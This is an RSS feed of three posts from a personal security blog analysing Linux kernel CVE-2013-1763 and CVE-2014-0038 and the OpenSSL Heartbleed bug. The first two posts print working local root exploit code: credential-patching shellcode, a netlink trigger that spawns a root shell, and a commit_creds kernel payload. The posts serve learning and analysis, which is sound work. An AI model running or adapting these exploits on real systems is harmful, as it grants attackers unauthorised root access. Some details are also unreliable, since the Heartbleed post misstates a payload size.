<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Security on fz84</title>
    <link>http://fanzy.me/tags/security/</link>
    <description>Recent content in Security on fz84</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 19 Apr 2014 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://fanzy.me/tags/security/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>CVE-2013-1763</title>
      <link>http://fanzy.me/post/CVE-2013-1763/</link>
      <pubDate>Sat, 19 Apr 2014 00:00:00 +0000</pubDate>
      
      <guid>http://fanzy.me/post/CVE-2013-1763/</guid>
      <description>

&lt;p&gt;Userland can send a netlink message requesting &lt;code&gt;SOCK_DIAG_BY_FAMILY&lt;/code&gt; with a family greater or equal then &lt;code&gt;AF_MAX&lt;/code&gt; &amp;ndash; the array size of &lt;code&gt;sock_diag_handlers[]&lt;/code&gt;. The current code does not test for this condition therefore is vulnerable to an out-of-bound access opening doors for a privilege escalation.&lt;/p&gt;

&lt;h2 id=&#34;vulnerability:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Vulnerability&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;diff --git a/net/core/sock_diag.c b/net/core/sock_diag.c
index 602cd63..750f44f 100644
--- a/net/core/sock_diag.c
+++ b/net/core/sock_diag.c
@@ -121,6 +121,9 @@ static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
  if (nlmsg_len(nlh) &amp;lt; sizeof(*req))
    return -EINVAL;
 
+ if (req-&amp;gt;sdiag_family &amp;gt;= AF_MAX)
+   return -EINVAL;
+
  hndl = sock_diag_lock_handler(req-&amp;gt;sdiag_family);
  if (hndl == NULL)
    err = -ENOENT;
  else
    err = hndl-&amp;gt;dump(skb, nlh); // hndl-&amp;gt;dump executes !!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In &lt;code&gt;__sock_diag_rcv_msg&lt;/code&gt; function, userland variable &lt;code&gt;req-&amp;gt;sdiag_family&lt;/code&gt; is passed uncheckly to &lt;code&gt;sock_diag_handler&lt;/code&gt;, within which overflow and exploit happens.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static const inline struct sock_diag_handler *sock_diag_lock_handler(int family)
{
  if (sock_diag_handlers[family] == NULL)
    request_module(&amp;quot;net-pf-%d-proto-%d-type-%d&amp;quot;, PF_NETLINK, NETLINK_SOCK_DIAG, family);

  mutex_lock(&amp;amp;sock_diag_table_mutex);
  return sock_diag_handlers[family];
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here the function returns a pointer &lt;code&gt;sock_diag_handlers + family&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct sock_diag_handler {
  __u8 family;
  int (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);
};
hndl = sock_diag_lock_handler(req-&amp;gt;sdiag_family);
hndl-&amp;gt;dump(skb, nlh); //(sock_diag_handlers + family + 8) executes !!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All story told, here we find that finally &lt;code&gt;(sock_diag_handlers + family + 8)&lt;/code&gt; executes in kernel mode.&lt;/p&gt;

&lt;h2 id=&#34;exploits:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Exploits&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Craft a piece of shell code.&lt;/li&gt;
&lt;li&gt;Calcualte the value of &lt;code&gt;family&lt;/code&gt; which points &lt;code&gt;sock_diag_handlers + family + 8&lt;/code&gt; to the shell code.&lt;/li&gt;
&lt;li&gt;Construct a package with large &lt;code&gt;family&lt;/code&gt; and set it.&lt;/li&gt;
&lt;li&gt;You got it.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;shell-code:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Shell code&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;get &lt;code&gt;current&lt;/code&gt; (pointer to the current process descriptor &lt;code&gt;task_struct&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Manipulate &lt;code&gt;process credentials&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static long ugid;
void patch_current() {
    int i,j,k;
    char *current = *(char**)(((long)&amp;amp;i) &amp;amp; (-8192));
    long kbase = ((long)current)&amp;gt;&amp;gt;36;
    
    for (i=0; i&amp;lt;4000; i+=4) {
        long *p = (void *)&amp;amp;current[i];
        int *t = (void*) p[0];
        if ((p[0] != p[1]) || ((p[0]&amp;gt;&amp;gt;36) != kbase)) continue;
        for (j=0; j&amp;lt;20; j++) {
            for (k = 0; k &amp;lt; 8; k++)
            if (((int*)&amp;amp;ugid)[k%2] != t[j+k])
            goto next;
            for (i = 0; i &amp;lt; 8; i++)
            t[j+i] = 0;
            for (i = 0; i &amp;lt; 10; i++)
            t[j+9+i] = -1;
            return;
next:;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;crafted-a-package:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Crafted a package&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct {
  struct nlmsghdr nlh;
  struct unix_diag_req r;
} req;

struct nlmsghdr {
  __u32   nlmsg_len;  /* Length of message including header */
  __u16   nlmsg_type; /* Message content */
  __u16   nlmsg_flags;  /* Additional flags */
  __u32   nlmsg_seq;  /* Sequence number */
  __u32   nlmsg_pid;  /* Sending process port ID */
};

struct unix_diag_req {
  __u8  sdiag_family;
  __u8  sdiag_protocol;
  __u16 pad;
  __u32 udiag_states;
  __u32 udiag_ino;
  __u32 udiag_show;
  __u32 udiag_cookie[2];
};
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;trigger:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Trigger&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int main()
{
  long u = getuid();
  long g = getgid();
  int i, f = socket(16,3,4);
  static int n[10] = {40,0x10014,0,0,45,-1};
 
  assert(mmap((void*)(1&amp;lt;&amp;lt;12), 1&amp;lt;&amp;lt;20, 3, 0x32, 0, 0)!=-1);
 
  setresuid(u,u,u); setresgid(g,g,g);
  ugid = (g&amp;lt;&amp;lt;32)|u;
 
  memcpy(1&amp;lt;&amp;lt;12, &amp;amp;patch_current, 1024);
  for (i = 0; i &amp;lt; (1&amp;lt;&amp;lt;17); i++) ((void**)(1&amp;lt;&amp;lt;12))[i] = &amp;amp;patch_current;
  send(f, n, sizeof(n), 0);
  setuid(0);
  return execl(&amp;quot;/bin/bash&amp;quot;, &amp;quot;-sh&amp;quot;, 0);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;reference:8058be7e9a7722a859fea59a1cfd58b1&#34;&gt;Reference&lt;/h2&gt;

&lt;p&gt;All credit goes to the authors of &lt;a href=&#34;http://www.exploit-db.com/exploits/24746/&#34;&gt;this&lt;/a&gt; and &lt;a href=&#34;http://www.exploit-db.com/exploits/24555/&#34;&gt;this&lt;/a&gt; exploits.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2014-0038</title>
      <link>http://fanzy.me/post/CVE-2014-0038/</link>
      <pubDate>Wed, 16 Apr 2014 00:00:00 +0000</pubDate>
      
      <guid>http://fanzy.me/post/CVE-2014-0038/</guid>
      <description>

&lt;p&gt;利用漏洞将 &lt;code&gt;ptmx_fops&lt;/code&gt; 返回函数的高字节置零，让它指向payload。然后payload在被kernel执行，调用 &lt;code&gt;commit_cred&lt;/code&gt; 获取root。&lt;/p&gt;

&lt;h1 id=&#34;vulnerability:782111c6003f4e7a42ea865448ddb72c&#34;&gt;Vulnerability&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg, unsigned int vlen, unsigned int flags, struct compat_timespec __user *timeout)
{
  int datagrams;
  struct timespec ktspec;
  
  if (flags &amp;amp; MSG_CMSG_COMPAT)
    return -EINVAL;
  
  if (COMPAT_USE_64BIT_TIME)
    return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
      flags | MSG_CMSG_COMPAT,
      (struct timespec *) timeout);
  ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;timeout&lt;/code&gt; 是从userland传过来的指针，随后被直接（只做了cast &lt;code&gt;(struct timespec *) timeout&lt;/code&gt; ）传给系统调用 &lt;code&gt;__sys_recvmmsg&lt;/code&gt; 。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Why &lt;code&gt;CONFIG_X86_X32&lt;/code&gt; is mandatory?&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct timespec {
  __kernel_time_t tv_sec;     /* seconds */
  long    tv_nsec;    /* nanoseconds */
};
typedef __kernel_long_t __kernel_time_t;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;__sys_recvmmsg&lt;/code&gt; 中有两处修改了 &lt;code&gt;void *timeout&lt;/code&gt; .&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;读取 &lt;code&gt;timeout&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (timeout &amp;amp;&amp;amp; 
        poll_select_set_timeout(&amp;amp;end_time, timeout-&amp;gt;tv_sec,
          timeout-&amp;gt;tv_nsec))  // READ ONLY, end_time = timeout
  return -EINVAL;
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;更新 &lt;code&gt;timeout&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (timeout) {
  ktime_get_ts(timeout);                         // get now
  *timeout = timespec_sub(end_time, *timeout);   // A - B
  if (timeout-&amp;gt;tv_sec &amp;lt; 0) {                     // if timeout really happens
    timeout-&amp;gt;tv_sec = timeout-&amp;gt;tv_nsec = 0;
    break;                                     // return
  }

  /* Timeout, return less than vlen datagrams */
  if (timeout-&amp;gt;tv_nsec == 0 &amp;amp;&amp;amp; timeout-&amp;gt;tv_sec == 0)
    break;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所以返回前将 &lt;code&gt;timeout-&amp;gt;tv_sec = timeout-&amp;gt;tv_nsec = 0;&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;清除一个字节的过程:782111c6003f4e7a42ea865448ddb72c&#34;&gt;清除一个字节的过程&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;主进程 &lt;code&gt;retval = syscall(__NR_recvmmsg, sockfd, &amp;amp;msgs, 1, 0, (void*)addr)&lt;/code&gt;; 其中 &lt;code&gt;addr &amp;amp; 0xFF == 0xFF&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;子进程 &lt;code&gt;sleep(254)&lt;/code&gt; 然后 sendto&lt;/li&gt;
&lt;li&gt;因为父进程调用 &lt;code&gt;recv&lt;/code&gt; 长达254s之后子进程才发送，所以父进程的调用 &lt;code&gt;__NR_recvmmsg&lt;/code&gt; 会超时&lt;/li&gt;
&lt;li&gt;超时发生时，&lt;code&gt;addr&lt;/code&gt; 被写 &lt;code&gt;0&lt;/code&gt;，然后返回。&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&#34;获取root:782111c6003f4e7a42ea865448ddb72c&#34;&gt;获取root&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;利用了 &lt;code&gt;ptmx_fops&lt;/code&gt; 的release function指针（在non initialized (and thus writable) kernel memory中）&lt;/li&gt;
&lt;li&gt;将指针的高3字节置0，使之指向用户空间中的payload&lt;/li&gt;
&lt;li&gt;Open &lt;code&gt;/dev/ptmx&lt;/code&gt;, close it and enjoy.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;payload构造:782111c6003f4e7a42ea865448ddb72c&#34;&gt;payload构造&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// code 是payload地址
code = (long)mmap((void*)(TTY_RELEASE &amp;amp; 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
// 0x90 技法
memset((void*)code, 0x90, PAYLOADSIZE);
code += PAYLOADSIZE - 1024;
memcpy((void*)code, &amp;amp;kernel_payload, 1024);

// payload 构造
#define COMMIT_CREDS        0xffffffff8108ad40LL
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

kernel_payload(void* foo, void* bar)
{
    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

    /* restore function pointer and following two longs */
    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;
    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 8)) = 0;
    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 16)) = 0;

    /* escalate to root */
    commit_creds(prepare_kernel_cred(0));

    return -1;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;疑问:782111c6003f4e7a42ea865448ddb72c&#34;&gt;疑问&lt;/h1&gt;

&lt;ol&gt;
&lt;li&gt;为什么 &lt;code&gt;zero_out&lt;/code&gt; 只置零1个字节，而不是一个 &lt;code&gt;long&lt;/code&gt; (16 bytes)？&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>Why heart bleeds</title>
      <link>http://fanzy.me/post/CVE-2014-0160/</link>
      <pubDate>Thu, 10 Apr 2014 00:00:00 +0000</pubDate>
      
      <guid>http://fanzy.me/post/CVE-2014-0160/</guid>
      <description>

&lt;p&gt;It&amp;rsquo;s not rare that the critical security infrastructure on which we heavily reply sometimes is broken, in one way or another. This blog investigated the &lt;code&gt;Heartbeat&lt;/code&gt; mechanism in TLS protocol and how it leads to the widely spread &lt;strong&gt;HeartBleed&lt;/strong&gt; vulnerability, aka CVE-2014-0160 in &lt;code&gt;OpenSSL 1.0.1&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;description-from-nvd:ce6f2c75e20b8ec034404887a73bf817&#34;&gt;Description from NVD&lt;/h2&gt;

&lt;p&gt;The (1) &lt;code&gt;TLS&lt;/code&gt; and (2) &lt;code&gt;DTLS&lt;/code&gt; implementations in &lt;code&gt;OpenSSL 1.0.1&lt;/code&gt; before &lt;code&gt;1.0.1g&lt;/code&gt; do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to &lt;code&gt;d1_both.c&lt;/code&gt; and &lt;code&gt;t1_lib.c&lt;/code&gt;, aka the Heartbleed bug.&lt;/p&gt;

&lt;p&gt;To &lt;a href=&#34;https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0160&#34;&gt;NVD&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;heartbeat-extension:ce6f2c75e20b8ec034404887a73bf817&#34;&gt;Heartbeat Extension&lt;/h2&gt;

&lt;p&gt;First let&amp;rsquo;s have a look at the Heartbeat Extension. The &lt;strong&gt;Heartbeat Extension&lt;/strong&gt; is a pretty new extension to the Transport Layer Security (TLS) and Datagram Transport Layer Security (DTLS) protocols. Essentially the Heartbeat Extension is designed to provide a faster and light-weight keeping-alive mechanism, and DTLS protocol can use it to perform path MTU (PMTU) discovery as well.&lt;/p&gt;

&lt;p&gt;Generally speaking, the Heartbeat Extension works in a quite simple way. Clients peroidcally send &lt;code&gt;HeartbeatRequest&lt;/code&gt; messages (including a random chosen payload) to server and the server respond with the exact copy of that payload. If the server&amp;rsquo;s response matches with the original message, the clients can make sure that that *the server is not only alive but responsive. Of course all the messages exchanged during this routine is on top of TLS layer. (Precisely speaking, the Heartbeat protocol is a new protocol running on top of the Record Layer.)For details please refer to &lt;a href=&#34;https://tools.ietf.org/html/rfc6520&#34;&gt;RFC6520&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;messages:ce6f2c75e20b8ec034404887a73bf817&#34;&gt;Messages&lt;/h2&gt;

&lt;p&gt;A natural question we&amp;rsquo;re gonna ask is how can this simple mechanism go wrong? To answer this question, we need to know some nitty-gritty. First, data structure. According to RFC6520, a HeartBeat message consists of &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;length&lt;/code&gt;, attached &lt;code&gt;payload&lt;/code&gt; and &lt;code&gt;padding&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct {
    HeartbeatMessageType type;
    uint16 payload_length;
    opaque payload[HeartbeatMessage.payload_length];
    opaque padding[padding_length];
} HeartbeatMessage;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Though the description in RFC is fairly clear and concise, I&amp;rsquo;d like to summarize several important and tangent facts for better understanding of CVE-2014-0160,&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The length of the &lt;code&gt;type&lt;/code&gt; field is 1 byte, and the length of the &lt;code&gt;payload_length&lt;/code&gt; is 2.&lt;/li&gt;
&lt;li&gt;A HeartbeatMessage must be shorter than &lt;code&gt;TLSPlaintext.length&lt;/code&gt;(TLS) or &lt;code&gt;DTLSPlaintext.length&lt;/code&gt;(DTLS). (decided through peer negotiation, default is 2^14 Bytes&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;padding_length&lt;/code&gt; must be at least 16.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;scene-of-the-accident:ce6f2c75e20b8ec034404887a73bf817&#34;&gt;Scene of the accident&lt;/h2&gt;

&lt;p&gt;So here is the vulnerable code in OpenSSL 1.0.1. Let&amp;rsquo;s check step by step to see what would happen when server receives the following &lt;code&gt;message&lt;/code&gt;:&lt;code&gt;char* message = &amp;quot;\x18\x03\x02\x00\x03\x01\x40\x00&amp;quot;&lt;/code&gt;. A few legends,&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;18&lt;/code&gt;   : Content type::Heartbeat&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0302&lt;/code&gt; : Major Version=3, Minor Version=2, indicates TLS 1.1&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0003&lt;/code&gt; : Length = 3&lt;/li&gt;
&lt;li&gt;&lt;code&gt;01&lt;/code&gt;   : TLS1_HB_REQUEST&lt;/li&gt;
&lt;li&gt;&lt;code&gt;4000&lt;/code&gt; : 0x4000=2^14=16384, indicates 64-byte payload&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Apparently, this packet is totally invalid, in that it claimed a non-existent 64 bytes payload. This is not hard to check at all, simply looking at the &lt;code&gt;length&lt;/code&gt; of the whole packet and the &lt;code&gt;padding_length&lt;/code&gt; is enough, because other parts is of fixed-length. However, OpenSSL didn&amp;rsquo;t do this simple check. In other words, the above packet, though apparently invalid, will be treated as normal in the following function.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int
tls1_process_heartbeat(SSL *s)
{
  unsigned char *p = &amp;amp;s-&amp;gt;s3-&amp;gt;rrec.data[0], *pl;   // (1) p points to packet
  unsigned short hbtype;
  unsigned int payload;
  unsigned int padding = 16; /* Use minimum padding */

  /* Read type and payload length first */
  hbtype = *p++;        // (2) p gets advanced to point to `payload_length`
  n2s(p, payload);      // (3) payload = n2s(*p), p+=2
  pl = p;               // (4) p and pl points to payload

  if (s-&amp;gt;msg_callback)
    s-&amp;gt;msg_callback(0, s-&amp;gt;version, TLS1_RT_HEARTBEAT,
      &amp;amp;s-&amp;gt;s3-&amp;gt;rrec.data[0], s-&amp;gt;s3-&amp;gt;rrec.length,
      s, s-&amp;gt;msg_callback_arg);

  if (hbtype == TLS1_HB_REQUEST)
    {
    unsigned char *buffer, *bp;
    int r;

    buffer = OPENSSL_malloc(1 + 2 + payload + padding);
    bp = buffer;      // (1) bp points to buffer

    /* Enter response type, length and copy payload */
    *bp++ = TLS1_HB_RESPONSE;    // (2) 1st byte: TYPE
    s2n(payload, bp);            // (3) 2-3 byte: payload_length
    memcpy(bp, pl, payload);     // (*) payload Bytes of secret copied **
    bp += payload;
    /* Random padding */
    RAND_pseudo_bytes(bp, padding);

    //... all secrets get sent to client ...
}

/* fetched from ssl/ssl_locl.h
  n2s(c, s)
  s = c[0] || c[1] (|| stands for concatanation)
  c = c + 2
*/
# define n2s(c,s)  ((s=(((unsigned int)(c[0]))&amp;lt;&amp;lt; 8)| (((unsigned int)(c[1])))),c+=2)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Suppose we call &lt;code&gt;tls1_process_heartbeat&lt;/code&gt; with the crafted packet &lt;code&gt;&amp;quot;\x18\x03\x02\x00\x03\x01\x40\x00&amp;quot;&lt;/code&gt;. What would happen is:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;p&lt;/code&gt; points to the beginning of HeartBeat message, i.e. the byte &lt;code&gt;&amp;quot;\x01&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hbtype := TLS1_HB_REQUEST&lt;/code&gt; and &lt;code&gt;p&lt;/code&gt; points to &lt;code&gt;payload_length&lt;/code&gt;, i.e. `&amp;rdquo;\x40\x00&amp;rdquo;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;payload := 0x4000&lt;/code&gt;, &lt;code&gt;p&lt;/code&gt; nows points to somewhere outside of the packet (note that packet has already ended, there is no payload at all!)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;memcpy(bp, pl, payload)&lt;/code&gt; actually copied 64 bytes memory from &lt;code&gt;pl&lt;/code&gt;, somewhere in stack, to the response packet that users that see in clear.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;fix-and-conclusion:ce6f2c75e20b8ec034404887a73bf817&#34;&gt;Fix and Conclusion&lt;/h2&gt;

&lt;p&gt;As we saw before, it&amp;rsquo;s fairly straightforward to fix this bug &amp;ndash; just check the length! It turned out basically just one line of C code can save the world. How surprising it is! Even though TLS is elegantly designed on board, even though the RFC is well written and carefully proof read, a single line of code can screw up everything. This bug reminds me of a sentence in Practical Cryptography:.&lt;/p&gt;

&lt;p&gt;Official patch is attached for completeness.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;diff --git a/ssl/t1_lib.c b/ssl/t1_lib.c
index b82fada..bddffd9 100644 (file)
--- a/ssl/t1_lib.c
+++ b/ssl/t1_lib.c
@@ -2588,16 +2588,20 @@ tls1_process_heartbeat(SSL *s)
        unsigned int payload;
        unsigned int padding = 16; /* Use minimum padding */

-       /* Read type and payload length first */
-       hbtype = *p++;
-       n2s(p, payload);
-       pl = p;
-
        if (s-&amp;gt;msg_callback)
                s-&amp;gt;msg_callback(0, s-&amp;gt;version, TLS1_RT_HEARTBEAT,
                        &amp;amp;s-&amp;gt;s3-&amp;gt;rrec.data[0], s-&amp;gt;s3-&amp;gt;rrec.length,
                        s, s-&amp;gt;msg_callback_arg);

+       /* Read type and payload length first */
+       if (1 + 2 + 16 &amp;gt; s-&amp;gt;s3-&amp;gt;rrec.length)
+               return 0; /* silently discard */
+       hbtype = *p++;
+       n2s(p, payload);
+       if (1 + 2 + payload + 16 &amp;gt; s-&amp;gt;s3-&amp;gt;rrec.length)
+               return 0; /* silently discard per RFC 6520 sec. 4 */
+       pl = p;
+
        if (hbtype == TLS1_HB_REQUEST)
                {
                unsigned char *buffer, *bp;
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>